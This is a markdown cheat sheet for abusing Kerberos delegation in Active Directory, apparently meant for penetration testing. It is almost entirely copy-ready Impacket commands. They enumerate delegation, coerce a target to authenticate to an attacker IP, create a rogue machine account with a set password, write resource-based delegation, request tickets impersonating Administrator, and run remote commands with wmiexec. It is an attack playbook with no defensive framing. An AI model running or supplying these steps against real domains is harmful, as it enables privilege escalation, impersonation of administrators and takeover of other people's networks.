# Delegation Abuse

## Find All Delegation Types
```bash
impacket-findDelegation $DOMAIN/user:pass@$DC_IP
```

## Unconstrained Delegation
Machine with `TRUSTED_FOR_DELEGATION`. Coerce auth to capture TGT.
```bash
impacket-coercer list -t $TARGET_IP
impacket-coercer coerce -t $TARGET_IP -l $ATTACK_IP
```

## Constrained Delegation
User has `TRUSTED_TO_AUTH_FOR_DELEGATION`.
```bash
impacket-getST -spn cifs/target.server $DOMAIN/user:pass -impersonate admin
export KRB5CCNAME=admin.ccache
impacket-wmiexec $DOMAIN/admin@target.server -k -no-pass
```

## Resource-Based Constrained Delegation (RBCD)
Requires `GenericWrite` on target computer.

```bash
# Step 1: Add a computer account
impacket-addcomputer $DOMAIN/user:password -method SAMR -computer-name ATTACK$ -computer-pass Hacked123

# Step 2: Set RBCD on target
impacket-rbcd $DOMAIN/user:password -delegate-to target$ -delegate-from ATTACK$ -dc-ip $DC_IP -action write

# Step 3: Get TGS as admin
impacket-getST $DOMAIN/ATTACK$ -spn cifs/target.dom.local -impersonate Administrator -hashes :ATTACK_HASH

# Step 4: Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec $DOMAIN/Administrator@target.dom.local -k -no-pass
```
